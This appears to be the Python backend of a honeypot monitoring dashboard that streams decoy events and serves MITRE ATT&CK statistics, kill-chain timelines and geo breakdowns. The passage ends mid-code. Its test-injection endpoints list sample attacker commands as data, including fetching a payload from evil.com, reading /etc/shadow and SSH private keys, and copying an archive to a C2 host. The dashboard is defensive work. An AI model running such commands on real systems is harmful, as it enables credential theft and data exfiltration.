"""
CI/CDecoy Dashboard — Backend
FastAPI + SSE (from NATS) + REST (from TimescaleDB)

Tables used: decoy_events (hypertable), decoy_sessions, engage_outcomes
"""

import asyncio
import json
import os
import time
import uuid
import random
from contextlib import asynccontextmanager
from datetime import datetime, timezone, timedelta
from typing import AsyncGenerator

import asyncpg
import nats
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from sse_starlette.sse import EventSourceResponse

# ── Inline enrichment (same as cti/enrichment.py) ──
from enrichment import classify_command, detect_kill_chain, enrich_event

# ── Config ──────────────────────────────────────────
NATS_URL = os.getenv("NATS_URL", "nats://localhost:4222")
DB_DSN = os.getenv("DB_DSN", "postgresql://cicdecoy:cicdecoy@localhost:5432/cicdecoy")
NATS_SUBJECTS = os.getenv("NATS_SUBJECTS", "cicdecoy.decoy.events.>")

# ── Global state ────────────────────────────────────
nc = None
db_pool = None
event_buffer: list[dict] = []
MAX_BUFFER = 500
subscribers: list[asyncio.Queue] = []
session_cache: dict[str, dict] = {}  # session_id -> {source_ip, username}

# ── Tactic → Severity mapping ──────────────────────
# Used to derive severity when the decoy doesn't set one.
# Highest-impact tactics get highest severity.
TACTIC_SEVERITY = {
    "exfiltration":         "critical",
    "impact":               "critical",
    "credential-access":    "high",
    "lateral-movement":     "high",
    "command-and-control":  "high",
    "persistence":          "high",
    "privilege-escalation": "high",
    "defense-evasion":      "medium",
    "execution":            "medium",
    "collection":           "medium",
    "initial-access":       "medium",
    "discovery":            "low",
    "reconnaissance":       "low",
    "resource-development": "low",
}

SEVERITY_RANK = {"critical": 5, "high": 4, "medium": 3, "low": 2, "info": 1}


def _derive_severity(payload: dict) -> str:
    """Derive severity from MITRE techniques when not explicitly set."""
    techniques = payload.get("mitre_techniques") or []
    if isinstance(techniques, str):
        try:
            techniques = json.loads(techniques)
        except (json.JSONDecodeError, TypeError):
            techniques = []

    best = "info"
    for t in techniques:
        if isinstance(t, dict):
            tactic = t.get("tactic", "")
            candidate = TACTIC_SEVERITY.get(tactic, "info")
            if SEVERITY_RANK.get(candidate, 0) > SEVERITY_RANK.get(best, 0):
                best = candidate
    return best


# ── Helpers ─────────────────────────────────────────
def _parse_raw(val):
    """Handle raw_data being either dict or JSON string."""
    if val is None:
        return {}
    if isinstance(val, dict):
        return val
    try:
        return json.loads(val)
    except (json.JSONDecodeError, TypeError):
        return {}


def _parse_dict(val):
    """Safely parse a value that might be dict, JSON string, or None."""
    if val is None:
        return {}
    if isinstance(val, dict):
        return val
    if isinstance(val, str):
        try:
            return json.loads(val)
        except (json.JSONDecodeError, TypeError):
            return {}
    return {}


def _json_field(val):
    """Parse a JSONB field that might be string or already-parsed."""
    if val is None:
        return []
    if isinstance(val, (list, dict)):
        return val
    try:
        return json.loads(val)
    except (json.JSONDecodeError, TypeError):
        return []


# ── NATS handler ────────────────────────────────────
async def nats_handler(msg):
    try:
        payload = json.loads(msg.data.decode())
    except (json.JSONDecodeError, UnicodeDecodeError):
        payload = {"raw": msg.data.decode(errors="replace")}

    # Inline enrichment — MERGE results into payload, don't replace it.
    # enrich_event() returns only {mitre_techniques, tool_signatures,
    # severity, tags}; overwriting payload would destroy source_ip,
    # session_id, event_type, raw_data, username, etc.
    try:
        enrichment = enrich_event(payload)
        payload.update(enrichment)
    except Exception:
        pass

    # ── Resolve IP/username from EVERY possible location ──
    # The SSH decoy nests client_ip/username inside "data" and/or
    # "raw_data" dicts.  We must check all of them on every event,
    # not just connection/auth events.
    data = _parse_dict(payload.get("data"))
    raw  = _parse_dict(payload.get("raw_data"))

    resolved_ip = (
        payload.get("source_ip")
        or payload.get("client_ip")
        or payload.get("src_ip")
        or data.get("client_ip")
        or data.get("source_ip")
        or data.get("src_ip")
        or data.get("ip")
        or raw.get("client_ip")
        or raw.get("source_ip")
        or raw.get("src_ip")
        or raw.get("ip")
    )

    resolved_user = (
        payload.get("username")
        or payload.get("user")
        or data.get("username")
        or data.get("user")
        or raw.get("username")
        or raw.get("user")
    )

    # Session cache: remember IP/username from connection/auth events,
    # backfill onto subsequent events that lack them.
    sid = payload.get("session_id")
    if sid:
        etype = payload.get("event_type", "")
        if etype in ("connection.new", "auth.success", "session.start"):
            if resolved_ip or resolved_user:
                cached = session_cache.setdefault(sid, {})
                if resolved_ip:
                    cached["source_ip"] = resolved_ip
                if resolved_user:
                    cached["username"] = resolved_user

        # Backfill from cache if we still don't have values
        cached = session_cache.get(sid)
        if cached:
            if not resolved_ip and cached.get("source_ip"):
                resolved_ip = cached["source_ip"]
            if not resolved_user and cached.get("username"):
                resolved_user = cached["username"]

    # Always promote to top level so SSE consumers see them
    if resolved_ip:
        payload["source_ip"] = resolved_ip
    if resolved_user:
        payload["username"] = resolved_user

    # ── Derive severity from MITRE tactics when not set ──
    existing_sev = payload.get("severity")
    if not existing_sev or existing_sev == "info":
        derived = _derive_severity(payload)
        if SEVERITY_RANK.get(derived, 0) > SEVERITY_RANK.get(existing_sev or "info", 0):
            payload["severity"] = derived

    event = {
        "subject": msg.subject,
        "ts": datetime.now(timezone.utc).isoformat(),
        "payload": payload,
    }

    # Ring buffer
    event_buffer.append(event)
    if len(event_buffer) > MAX_BUFFER:
        event_buffer.pop(0)

    # Fan out to SSE subscribers
    dead = []
    for q in subscribers:
        try:
            q.put_nowait(event)
        except asyncio.QueueFull:
            dead.append(q)
    for q in dead:
        subscribers.remove(q)


# ── Lifecycle ───────────────────────────────────────
@asynccontextmanager
async def lifespan(app: FastAPI):
    global nc, db_pool

    # Connect DB
    try:
        db_pool = await asyncpg.create_pool(DB_DSN, min_size=2, max_size=10, timeout=10)
        async with db_pool.acquire() as conn:
            v = await conn.fetchval("SELECT version()")
            print(f"[db] Connected — {v[:60]}")
    except Exception as e:
        print(f"[db] WARNING — running without DB: {e}")
        db_pool = None

    # Connect NATS
    try:
        nc = await nats.connect(NATS_URL)
        await nc.subscribe(NATS_SUBJECTS, cb=nats_handler)
        print(f"[nats] Subscribed to {NATS_SUBJECTS}")
    except Exception as e:
        print(f"[nats] WARNING — running without NATS: {e}")
        nc = None

    yield

    if nc and nc.is_connected:
        await nc.drain()
    if db_pool:
        await db_pool.close()


app = FastAPI(title="CI/CDecoy Dashboard", lifespan=lifespan)
app.mount("/static", StaticFiles(directory="static"), name="static")


# ── SSE: Live event stream ──────────────────────────
@app.get("/api/events/stream")
async def event_stream(request: Request):
    q: asyncio.Queue = asyncio.Queue(maxsize=100)
    subscribers.append(q)

    async def generate() -> AsyncGenerator[dict, None]:
        for ev in event_buffer[-50:]:
            yield {"event": "decoy_event", "data": json.dumps(ev)}
        try:
            while True:
                if await request.is_disconnected():
                    break
                try:
                    ev = await asyncio.wait_for(q.get(), timeout=15.0)
                    yield {"event": "decoy_event", "data": json.dumps(ev)}
                except asyncio.TimeoutError:
                    yield {"event": "ping", "data": "keepalive"}
        finally:
            if q in subscribers:
                subscribers.remove(q)

    return EventSourceResponse(generate())


# ── REST: Quick Stats ───────────────────────────────
@app.get("/api/stats")
async def get_stats():
    if not db_pool:
        return JSONResponse({
            "total_sessions": 0, "active_sessions": 0,
            "total_events": len(event_buffer), "unique_ips": 0,
            "high_sev_24h": 0, "honeytokens_triggered": 0, "kill_chains": 0,
            "db_connected": False, "nats_connected": nc is not None and nc.is_connected,
        })

    async with db_pool.acquire() as conn:
        s = await conn.fetchrow("""
            SELECT
                (SELECT COUNT(*) FROM decoy_events WHERE timestamp > NOW() - INTERVAL '24 hours') AS ev24,
                (SELECT COUNT(DISTINCT session_id) FROM decoy_events) AS total_sessions,
                (SELECT COUNT(DISTINCT session_id) FROM decoy_events
                 WHERE event_type = 'connection.new'
                   AND timestamp > NOW() - INTERVAL '1 hour'
                   AND session_id NOT IN (
                     SELECT session_id FROM decoy_events WHERE event_type = 'session.end'
                   )) AS active,
                (SELECT COUNT(DISTINCT source_ip) FROM decoy_events
                 WHERE source_ip IS NOT NULL AND source_ip::TEXT != '127.0.0.1') AS ips,
                (SELECT COUNT(*) FROM decoy_events
                 WHERE severity IN ('high','critical')
                   AND timestamp > NOW() - INTERVAL '24 hours') AS high24,
                (SELECT COUNT(*) FROM decoy_events
                 WHERE event_type = 'honeytoken.triggered') AS ht,
                (SELECT COUNT(*) FROM (
                    SELECT e.session_id
                    FROM decoy_events e,
                         jsonb_array_elements(e.mitre_techniques) AS t(tech)
                    WHERE e.source_ip::TEXT != '127.0.0.1'
                    GROUP BY e.session_id
                    HAVING COUNT(DISTINCT (t.tech->>'tactic')) >= 3
                ) kc_sub) AS kc
        """)

    return {
        "total_sessions": s["total_sessions"], "active_sessions": s["active"],
        "total_events": s["ev24"], "unique_ips": s["ips"],
        "high_sev_24h": s["high24"], "honeytokens_triggered": s["ht"],
        "kill_chains": s["kc"],
        "db_connected": True,
        "nats_connected": nc is not None and nc.is_connected,
    }


# ── REST: Sessions ──────────────────────────────────
@app.get("/api/sessions")
async def get_sessions(limit: int = 50):
    if not db_pool:
        return JSONResponse({"sessions": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT
                session_id,
                MAX(decoy_name) AS decoy_name,
                MAX(decoy_tier) AS decoy_tier,
                COALESCE(
                    MAX(source_ip)::TEXT,
                    MAX(raw_data->>'client_ip'),
                    MAX(raw_data->'data'->>'client_ip'),
                    MAX(raw_data->>'source_ip')
                ) AS source_ip,
                COALESCE(
                    MAX(raw_data->>'username'),
                    MAX(raw_data->'data'->>'username'),
                    MAX(raw_data->>'user')
                ) AS auth_username,
                MIN(timestamp) AS start_time,
                MAX(timestamp) AS end_time,
                EXTRACT(EPOCH FROM MAX(timestamp) - MIN(timestamp))::INT AS duration_seconds,
                COUNT(*) AS event_count,
                MAX(severity) AS max_severity
            FROM decoy_events
            WHERE session_id != '' AND session_id != 'system' AND session_id != 'pre-auth'
            GROUP BY session_id
            ORDER BY MAX(timestamp) DESC
            LIMIT $1
        """, limit)

    sessions = []
    for r in rows:
        # Gather MITRE techniques for this session in a separate query
        techs = []
        try:
            async with db_pool.acquire() as conn:
                tech_rows = await conn.fetch("""
                    SELECT DISTINCT t->>'technique_id' AS tid,
                           t->>'technique_name' AS tname,
                           t->>'tactic' AS tactic
                    FROM decoy_events,
                         jsonb_array_elements(mitre_techniques) AS t
                    WHERE session_id = $1
                      AND jsonb_array_length(mitre_techniques) > 0
                """, r["session_id"])
                techs = [{"technique_id": t["tid"], "technique_name": t["tname"], "tactic": t["tactic"]} for t in tech_rows]
        except Exception:
            pass

        tactics = list(set(t["tactic"] for t in techs if t.get("tactic")))

        sessions.append({
            "session_id": r["session_id"],
            "decoy_name": r["decoy_name"],
            "decoy_tier": r["decoy_tier"],
            "source_ip": r["source_ip"],
            "start_time": r["start_time"].isoformat() if r["start_time"] else None,
            "end_time": r["end_time"].isoformat() if r["end_time"] else None,
            "duration_seconds": r["duration_seconds"],
            "auth_username": r["auth_username"],
            "command_count": r["event_count"],
            "max_severity": r["max_severity"],
            "mitre_techniques": techs,
            "attack_phases": tactics,
            "kill_chain_detected": len(tactics) >= 3,
        })

    return {"sessions": sessions}


# ── REST: Session drill-down ────────────────────────
@app.get("/api/sessions/{session_id}/events")
async def get_session_events(session_id: str):
    if not db_pool:
        return JSONResponse({"events": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT event_id, timestamp, event_type, severity,
                   source_ip::TEXT, source_port, raw_data,
                   mitre_techniques, tool_signatures, tags
            FROM decoy_events
            WHERE session_id = $1
            ORDER BY timestamp ASC
        """, session_id)

    return {
        "session_id": session_id,
        "events": [
            {
                "event_id": r["event_id"],
                "timestamp": r["timestamp"].isoformat(),
                "event_type": r["event_type"],
                "severity": r["severity"],
                "source_ip": r["source_ip"],
                "command": (_parse_raw(r["raw_data"])).get("command", (_parse_raw(r["raw_data"])).get("input", "")),
                "raw_data": _parse_raw(r["raw_data"]),
                "mitre_techniques": _json_field(r["mitre_techniques"]),
                "tool_signatures": _json_field(r["tool_signatures"]),
            }
            for r in rows
        ],
    }


# ── REST: Recent events ────────────────────────────
@app.get("/api/events")
async def get_events(limit: int = 100, severity: str = None):
    if not db_pool:
        return JSONResponse({"events": [], "error": "DB not connected"})

    if severity:
        async with db_pool.acquire() as conn:
            rows = await conn.fetch("""
                SELECT event_id, timestamp, decoy_name, event_type,
                       source_ip::TEXT, severity, raw_data, mitre_techniques
                FROM decoy_events
                WHERE severity = $1
                ORDER BY timestamp DESC LIMIT $2
            """, severity, limit)
    else:
        async with db_pool.acquire() as conn:
            rows = await conn.fetch("""
                SELECT event_id, timestamp, decoy_name, event_type,
                       source_ip::TEXT, severity, raw_data, mitre_techniques
                FROM decoy_events
                ORDER BY timestamp DESC LIMIT $1
            """, limit)

    return {
        "events": [
            {
                "event_id": r["event_id"],
                "timestamp": r["timestamp"].isoformat(),
                "decoy_name": r["decoy_name"],
                "event_type": r["event_type"],
                "source_ip": r["source_ip"],
                "severity": r["severity"],
                "raw_data": _parse_raw(r["raw_data"]),
                "mitre_techniques": _json_field(r["mitre_techniques"]),
            }
            for r in rows
        ],
    }


# ── REST: MITRE technique heatmap ───────────────────
@app.get("/api/mitre")
async def get_mitre_summary():
    if not db_pool:
        return JSONResponse({"techniques": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT
                t.tech->>'technique_id' AS technique_id,
                t.tech->>'technique_name' AS technique_name,
                t.tech->>'tactic' AS tactic,
                COUNT(*) AS total,
                COUNT(DISTINCT e.source_ip) AS actors,
                MAX(e.timestamp) AS last_seen
            FROM decoy_events e,
                 jsonb_array_elements(e.mitre_techniques) AS t(tech)
            WHERE e.timestamp > NOW() - INTERVAL '7 days'
            GROUP BY t.tech->>'technique_id',
                     t.tech->>'technique_name',
                     t.tech->>'tactic'
            ORDER BY total DESC
            LIMIT 30
        """)

    return {
        "techniques": [
            {
                "technique_id": r["technique_id"],
                "technique_name": r["technique_name"],
                "tactic": r["tactic"],
                "total": r["total"],
                "actors": r["actors"],
                "last_seen": r["last_seen"].isoformat() if r["last_seen"] else None,
            }
            for r in rows
        ],
    }


# ── REST: Engage Effectiveness ──────────────────────
TACTIC_TO_ENGAGE = {
    "discovery": "EAC0004 — Pocket Litter",
    "credential-access": "EAC0005 — Lure",
    "lateral-movement": "EAC0014 — Network Manipulation",
    "execution": "EAC0006 — Behavioral Analytics",
    "persistence": "EAC0021 — Monitoring",
    "exfiltration": "EAC0003 — Burn Notice",
    "collection": "EAC0004 — Pocket Litter",
    "command-and-control": "EAC0014 — Network Manipulation",
    "privilege-escalation": "EAC0006 — Behavioral Analytics",
    "impact": "EAC0003 — Burn Notice",
    "defense-evasion": "EAC0006 — Behavioral Analytics",
    "initial-access": "EAC0005 — Lure",
    "reconnaissance": "EAC0004 — Pocket Litter",
}


@app.get("/api/engage")
async def get_engage():
    if not db_pool:
        return JSONResponse({"engage": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT
                t.tech->>'technique_id' AS tid,
                t.tech->>'technique_name' AS tname,
                t.tech->>'tactic' AS tactic,
                COUNT(*) AS times_observed,
                COUNT(DISTINCT e.session_id) AS sessions,
                COUNT(DISTINCT e.session_id) FILTER (
                    WHERE (SELECT COUNT(DISTINCT t2.tac->>'tactic')
                           FROM decoy_events e2,
                                jsonb_array_elements(e2.mitre_techniques) AS t2(tac)
                           WHERE e2.session_id = e.session_id) >= 3
                ) AS kill_chains,
                AVG(EXTRACT(EPOCH FROM e.timestamp - (
                    SELECT MIN(e3.timestamp) FROM decoy_events e3
                    WHERE e3.session_id = e.session_id
                ))) AS avg_dur
            FROM decoy_events e,
                 jsonb_array_elements(e.mitre_techniques) AS t(tech)
            WHERE e.timestamp > NOW() - INTERVAL '7 days'
            GROUP BY t.tech->>'technique_id',
                     t.tech->>'technique_name',
                     t.tech->>'tactic'
            ORDER BY times_observed DESC
            LIMIT 100
        """)

    engage = []
    for r in rows:
        tactic = r["tactic"] or "unknown"
        activity = TACTIC_TO_ENGAGE.get(tactic, "EAC0021 — Monitoring")
        dur = float(r["avg_dur"]) if r["avg_dur"] else 0
        eff = min(1.0, (dur / 300) * 0.5 + (r["kill_chains"] / max(r["sessions"], 1)) * 0.5)
        engage.append({
            "technique_id": r["tid"],
            "technique_name": r["tname"],
            "engage_activity": activity,
            "times_observed": r["times_observed"],
            "effectiveness": round(eff, 2),
            "last_seen": None,
        })

    return {"engage": engage}


# ── REST: Top IPs ──────────────────────────────────
@app.get("/api/top-ips")
async def get_top_ips(hours: int = 24, limit: int = 15):
    if not db_pool:
        return JSONResponse({"ips": []})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT source_ip::TEXT, COUNT(*) AS events,
                   MAX(severity) AS max_severity,
                   COUNT(DISTINCT session_id) AS sessions
            FROM decoy_events
            WHERE timestamp > NOW() - make_interval(hours => $1)
              AND source_ip::TEXT != '127.0.0.1'
            GROUP BY source_ip ORDER BY events DESC LIMIT $2
        """, hours, limit)
    return {"ips": [dict(r) for r in rows]}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  NEW ENDPOINTS: Kill Chain, Duration Histogram, Geo
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# ── REST: Kill Chain Timelines ─────────────────────
PHASE_ORDER = [
    "reconnaissance", "resource-development", "initial-access",
    "execution", "persistence", "privilege-escalation",
    "defense-evasion", "credential-access", "discovery",
    "lateral-movement", "collection", "command-and-control",
    "exfiltration", "impact",
]


@app.get("/api/kill-chains")
async def get_kill_chains(limit: int = 20):
    """Sessions with 3+ ATT&CK phases, ordered by kill chain progression."""
    if not db_pool:
        return JSONResponse({"sessions": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT
                e.session_id,
                MAX(e.source_ip)::TEXT AS source_ip,
                MAX(e.decoy_name) AS decoy_name,
                MAX(e.raw_data->>'username') AS auth_username,
                EXTRACT(EPOCH FROM MAX(e.timestamp) - MIN(e.timestamp))::INT AS duration_seconds,
                COUNT(*) FILTER (WHERE e.event_type IN ('command.exec','command','command.response')) AS command_count,
                MIN(e.timestamp) AS start_time,
                COALESCE(
                    jsonb_agg(DISTINCT t.tech) FILTER (WHERE t.tech IS NOT NULL),
                    '[]'::jsonb
                ) AS mitre_techniques,
                COALESCE(
                    array_agg(DISTINCT (t.tech->>'tactic')) FILTER (WHERE t.tech->>'tactic' IS NOT NULL),
                    ARRAY[]::TEXT[]
                ) AS attack_phases
            FROM decoy_events e
            LEFT JOIN LATERAL jsonb_array_elements(e.mitre_techniques) AS t(tech) ON TRUE
            WHERE e.source_ip::TEXT != '127.0.0.1'
            GROUP BY e.session_id
            HAVING COUNT(DISTINCT (t.tech->>'tactic')) >= 3
            ORDER BY MIN(e.timestamp) DESC
            LIMIT $1
        """, limit)

    results = []
    for r in rows:
        techniques = _json_field(r["mitre_techniques"])
        phases_raw = [p for p in (r["attack_phases"] or []) if p]

        # Build ordered phase list with associated techniques
        phase_details = []
        for phase in PHASE_ORDER:
            if phase in phases_raw:
                techs_in_phase = [
                    t for t in techniques
                    if isinstance(t, dict) and t.get("tactic") == phase
                ]
                phase_details.append({
                    "phase": phase,
                    "index": PHASE_ORDER.index(phase),
                    "techniques": [
                        {"id": t.get("technique_id", ""), "name": t.get("technique_name", "")}
                        for t in techs_in_phase
                    ],
                })

        results.append({
            "session_id": r["session_id"],
            "source_ip": r["source_ip"],
            "auth_username": r["auth_username"],
            "decoy_name": r["decoy_name"],
            "duration_seconds": r["duration_seconds"],
            "command_count": r["command_count"],
            "start_time": r["start_time"].isoformat() if r["start_time"] else None,
            "phase_count": len(phase_details),
            "phases": phase_details,
        })

    return {"sessions": results}


# ── REST: Duration Histogram ───────────────────────
DURATION_BUCKETS = [
    ("0-10s",    0,    10),
    ("10-30s",   10,   30),
    ("30s-1m",   30,   60),
    ("1-5m",     60,   300),
    ("5-15m",    300,  900),
    ("15-60m",   900,  3600),
    ("60m+",     3600, None),
]


@app.get("/api/duration-histogram")
async def get_duration_histogram():
    """Bucket session durations for histogram display."""
    if not db_pool:
        return JSONResponse({"buckets": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT EXTRACT(EPOCH FROM MAX(timestamp) - MIN(timestamp))::INT AS duration_seconds
            FROM decoy_events
            WHERE source_ip::TEXT != '127.0.0.1'
            GROUP BY session_id
            HAVING EXTRACT(EPOCH FROM MAX(timestamp) - MIN(timestamp)) > 0
            ORDER BY duration_seconds
        """)

    durations = [r["duration_seconds"] for r in rows]

    buckets = []
    for label, lo, hi in DURATION_BUCKETS:
        if hi is not None:
            count = sum(1 for d in durations if lo <= d < hi)
        else:
            count = sum(1 for d in durations if d >= lo)
        buckets.append({"label": label, "count": count, "lo": lo, "hi": hi})

    total = len(durations)
    avg = sum(durations) / total if total > 0 else 0
    median = sorted(durations)[total // 2] if total > 0 else 0

    return {
        "buckets": buckets,
        "total_sessions": total,
        "avg_seconds": round(avg, 1),
        "median_seconds": round(median, 1),
    }


# ── REST: Geographic Breakdown ─────────────────────
@app.get("/api/geo")
async def get_geo_breakdown(hours: int = 168):
    """Country-code frequency from geo JSONB. Default: last 7 days."""
    if not db_pool:
        return JSONResponse({"countries": [], "error": "DB not connected"})

    async with db_pool.acquire() as conn:
        rows = await conn.fetch("""
            SELECT
                e.geo->>'country' AS country_code,
                e.geo->>'country_name' AS country_name,
                COUNT(DISTINCT e.session_id) AS sessions,
                COUNT(DISTINCT e.source_ip::TEXT) AS unique_ips,
                SUM(CASE WHEN e.event_type IN ('command.exec','command') THEN 1 ELSE 0 END) AS total_commands,
                AVG(EXTRACT(EPOCH FROM sub.dur)) AS avg_duration
            FROM decoy_events e
            LEFT JOIN LATERAL (
                SELECT MAX(e2.timestamp) - MIN(e2.timestamp) AS dur
                FROM decoy_events e2
                WHERE e2.session_id = e.session_id
            ) sub ON TRUE
            WHERE e.geo IS NOT NULL
              AND e.geo->>'country' IS NOT NULL
              AND e.source_ip::TEXT != '127.0.0.1'
              AND e.timestamp > NOW() - make_interval(hours => $1)
            GROUP BY e.geo->>'country', e.geo->>'country_name'
            ORDER BY sessions DESC
        """, hours)

    return {
        "countries": [
            {
                "country_code": r["country_code"],
                "country_name": r["country_name"] or r["country_code"],
                "sessions": r["sessions"],
                "unique_ips": r["unique_ips"],
                "total_commands": r["total_commands"] or 0,
                "avg_duration": round(float(r["avg_duration"]), 1) if r["avg_duration"] else 0,
            }
            for r in rows
        ],
        "period_hours": hours,
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  DEV: Inject test event
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SAMPLE_TECHNIQUES = [
    {"technique_id": "T1059.004", "technique_name": "Unix Shell", "tactic": "execution"},
    {"technique_id": "T1003.008", "technique_name": "/etc/passwd and /etc/shadow", "tactic": "credential-access"},
    {"technique_id": "T1082", "technique_name": "System Information Discovery", "tactic": "discovery"},
    {"technique_id": "T1021.004", "technique_name": "SSH Lateral Movement", "tactic": "lateral-movement"},
    {"technique_id": "T1083", "technique_name": "File and Directory Discovery", "tactic": "discovery"},
    {"technique_id": "T1046", "technique_name": "Network Service Discovery", "tactic": "discovery"},
    {"technique_id": "T1560", "technique_name": "Archive Collected Data", "tactic": "collection"},
]

SAMPLE_COMMANDS = [
    "cat /etc/shadow", "whoami", "uname -a", "id", "ls -la /root",
    "wget http://evil.com/payload.sh", "curl ifconfig.me",
    "netstat -tlnp", "find / -name '*.pem'", "ssh root@10.0.0.5",
    "tar czf /tmp/data.tar.gz /etc", "cat /etc/passwd",
    "ps aux", "history", "cat ~/.ssh/id_rsa",
]

SAMPLE_GEOS = [
    {"country": "CN", "country_name": "China", "city": "Beijing", "latitude": 39.9, "longitude": 116.4},
    {"country": "RU", "country_name": "Russia", "city": "Moscow", "latitude": 55.7, "longitude": 37.6},
    {"country": "US", "country_name": "United States", "city": "New York", "latitude": 40.7, "longitude": -74.0},
    {"country": "DE", "country_name": "Germany", "city": "Berlin", "latitude": 52.5, "longitude": 13.4},
    {"country": "BR", "country_name": "Brazil", "city": "Sao Paulo", "latitude": -23.5, "longitude": -46.6},
    {"country": "KR", "country_name": "South Korea", "city": "Seoul", "latitude": 37.6, "longitude": 127.0},
    {"country": "IR", "country_name": "Iran", "city": "Tehran", "latitude": 35.7, "longitude": 51.4},
    {"country": "VN", "country_name": "Vietnam", "city": "Hanoi", "latitude": 21.0, "longitude": 105.8},
    {"country": "IN", "country_name": "India", "city": "Mumbai", "latitude": 19.1, "longitude": 72.9},
    {"country": "NL", "country_name": "Netherlands", "city": "Amsterdam", "latitude": 52.4, "longitude": 4.9},
]


@app.post("/api/test/inject")
async def inject_test_event():
    now = datetime.now(timezone.utc)
    tech = random.choice(SAMPLE_TECHNIQUES)
    cmd = random.choice(SAMPLE_COMMANDS)
    src_ip = f"{random.choice([198,203,45,91,185])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    event_id = str(uuid.uuid4())[:12]
    session_id = f"sess-{random.randint(1000,9999)}"

    # Derive severity from the technique's tactic instead of random
    sev = TACTIC_SEVERITY.get(tech["tactic"], "info")

    username = random.choice(["root", "admin", "deploy", "ubuntu"])

    fake = {
        "event_id": event_id,
        "timestamp": now.isoformat(),
        "decoy_name": random.choice(["ssh-decoy-01", "ssh-decoy-02"]),
        "decoy_tier": random.choice([2, 3]),
        "session_id": session_id,
        "event_type": random.choice(["command.exec", "auth.success", "connection.new"]),
        "source_ip": src_ip,
        "username": username,
        "source_port": random.randint(40000, 65000),
        "severity": sev,
        "raw_data": {"command": cmd, "response": "...", "username": username},
        "mitre_techniques": [tech],
        "geo": random.choice(SAMPLE_GEOS),
        "tool_signatures": [],
        "tags": [],
    }

    subject = f"cicdecoy.decoy.events.{fake['event_type']}"

    if nc and nc.is_connected:
        await nc.publish(subject, json.dumps(fake).encode())
        return {"status": "published_to_nats", "event_id": event_id}
    else:
        event = {"subject": subject, "ts": now.isoformat(), "payload": fake}
        event_buffer.append(event)
        if len(event_buffer) > MAX_BUFFER:
            event_buffer.pop(0)
        for q in subscribers:
            try:
                q.put_nowait(event)
            except asyncio.QueueFull:
                pass
        return {"status": "local_only", "event_id": event_id}


# ── DEV: Inject a full realistic session ───────────
ATTACK_SCENARIOS = [
    ("whoami",                  "T1033",     "System Owner/User Discovery",       "discovery",          "info"),
    ("id",                      "T1033",     "System Owner/User Discovery",       "discovery",          "info"),
    ("uname -a",                "T1082",     "System Information Discovery",      "discovery",          "low"),
    ("cat /etc/passwd",         "T1003.008", "/etc/passwd and /etc/shadow",       "credential-access",  "high"),
    ("cat /etc/shadow",         "T1003.008", "/etc/passwd and /etc/shadow",       "credential-access",  "critical"),
    ("find / -name '*.pem'",    "T1083",     "File and Directory Discovery",      "discovery",          "medium"),
    ("cat ~/.ssh/id_rsa",       "T1552.004", "Private Keys",                      "credential-access",  "critical"),
    ("wget http://evil.com/s",  "T1105",     "Ingress Tool Transfer",             "command-and-control","high"),
    ("chmod +x /tmp/s",         "T1222.002", "Linux File Permissions Modification","defense-evasion",   "medium"),
    ("curl ifconfig.me",        "T1016",     "System Network Configuration",      "discovery",          "low"),
    ("netstat -tlnp",           "T1049",     "System Network Connections",        "discovery",          "low"),
    ("ssh root@10.0.0.5",       "T1021.004", "SSH",                               "lateral-movement",   "high"),
    ("tar czf /tmp/d.tgz /etc", "T1560.001", "Archive via Utility",              "collection",         "high"),
    ("crontab -e",              "T1053.003", "Cron",                              "persistence",        "high"),
    ("ps aux",                  "T1057",     "Process Discovery",                 "discovery",          "info"),
    ("/tmp/s -p 4444",          "T1059.004", "Unix Shell",                        "execution",          "critical"),
    ("scp /tmp/d.tgz x@c2:/",  "T1041",     "Exfiltration Over C2",             "exfiltration",       "critical"),
]


@app.post("/api/test/inject-session")
async def inject_test_session(event_count: int = 8):
    """Generate a full realistic attack session with 3+ tactics for kill chain testing."""
    now = datetime.now(timezone.utc)
    session_id = f"test-kc-{uuid.uuid4().hex[:8]}"
    src_ip = f"{random.choice([198,203,45,91,185])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    decoy_name = random.choice(["ssh-decoy-01", "ssh-decoy-02"])
    geo = random.choice(SAMPLE_GEOS)
    username = random.choice(["root", "admin", "deploy", "ubuntu"])

    tactics_seen = set()
    chosen = []

    shuffled = random.sample(ATTACK_SCENARIOS, len(ATTACK_SCENARIOS))
    for scenario in shuffled:
        if len(chosen) >= event_count:
            break
        tactic = scenario[3]
        if len(tactics_seen) < 3 or tactic in tactics_seen or random.random() > 0.3:
            chosen.append(scenario)
            tactics_seen.add(tactic)

    if len(tactics_seen) < 3:
        for scenario in shuffled:
            if scenario[3] not in tactics_seen:
                chosen.append(scenario)
                tactics_seen.add(scenario[3])
            if len(tactics_seen) >= 4:
                break

    events = []
    for i, (cmd, tid, tname, tactic, sev) in enumerate(chosen):
        ts = now + timedelta(seconds=i * random.randint(3, 30))
        event_id = f"{session_id}-{i:03d}"

        event = {
            "event_id": event_id,
            "timestamp": ts.isoformat(),
            "decoy_name": decoy_name,
            "decoy_tier": 2,
            "session_id": session_id,
            "event_type": "command.exec" if i > 0 else "connection.new",
            "source_ip": src_ip,
            "username": username,
            "source_port": random.randint(40000, 65000),
            "severity": sev,
            "raw_data": json.dumps({"command": cmd, "response": "...", "username": username}),
            "mitre_techniques": json.dumps([{
                "technique_id": tid,
                "technique_name": tname,
